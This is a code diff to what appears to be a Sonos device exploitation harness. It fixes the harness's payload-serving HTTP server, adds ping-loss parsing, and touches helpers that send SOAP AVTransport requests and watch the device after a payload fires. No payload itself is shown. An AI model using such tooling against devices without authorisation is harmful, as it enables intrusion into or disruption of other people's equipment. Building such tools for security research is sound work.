@@ -72,9 +72,15 @@ def _server(host, port, payload_dir):
     class H(http.server.BaseHTTPRequestHandler):
         def do_GET(self):
             p = os.path.join(payload_dir, self.path.split("?")[0].lstrip("/"))
-            data = open(p, "rb").read() if os.path.exists(p) else b"x"
-            self.send_response(200); self.send_header("Content-Length", str(len(data)))
-            self.end_headers(); self.wfile.write(data)
+            if os.path.isfile(p):
+                data = open(p, "rb").read()
+                self.send_response(200)
+                self.send_header("Content-Length", str(len(data)))
+                self.end_headers(); self.wfile.write(data)
+            else:
+                # 404 rather than a filler byte: a missing payload then shows up as a failed
+                # fetch instead of a silently truncated stream.
+                self.send_error(404)
         def log_message(self, fmt, *a):
             try:
                 with open("/tmp/sonos-exploit-server.log", "a") as fh:
@@ -82,8 +88,9 @@ def _server(host, port, payload_dir):
             except Exception:
                 pass
     socketserver.TCPServer.allow_reuse_address = True
-    t = threading.Thread(target=lambda: socketserver.TCPServer((host, port), H).serve_forever(), daemon=True)
-    t.start(); return t
+    srv = socketserver.TCPServer((host, port), H)      # bind here so a failure raises in the caller
+    t = threading.Thread(target=srv.serve_forever, daemon=True)
+    t.start(); return srv
 
 def soap(device, action, extra="", ctl_path="/MediaRenderer/AVTransport/Control", timeout=15):
     body = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
@@ -137,9 +144,22 @@ def port_open(device, port):
     r = subprocess.run(["nc","-z","-G","3",device,str(port)], capture_output=True, text=True)
     return r.returncode == 0
 
+LOSS_RE = re.compile(r"(\d+(?:\.\d+)?)% packet loss")
+
+
+def parse_loss(ping_output):
+    """Percent of lost packets out of a ping's summary, or None when unparsable.
+
+    macOS prints `0.0% packet loss` (not `0%`), so substring matching reads every healthy
+    unit as dead — the bug that made every `verdict` say REBOOT until 2026-11-21."""
+    m = LOSS_RE.search(ping_output or "")
+    return float(m.group(1)) if m else None
+
+
 def icmp_ok(device):
     r = subprocess.run(["ping","-c","1","-W","1000",device], capture_output=True, text=True)
-    return " 0% packet loss" in r.stdout
+    loss = parse_loss(r.stdout)
+    return loss is not None and loss < 100.0
 
 def fire_and_watch(device, payload_name, S, host=None, port=8981,
                    payload_dir=PAYLOAD_DIR, ports=(), watch_s=100, log=print):
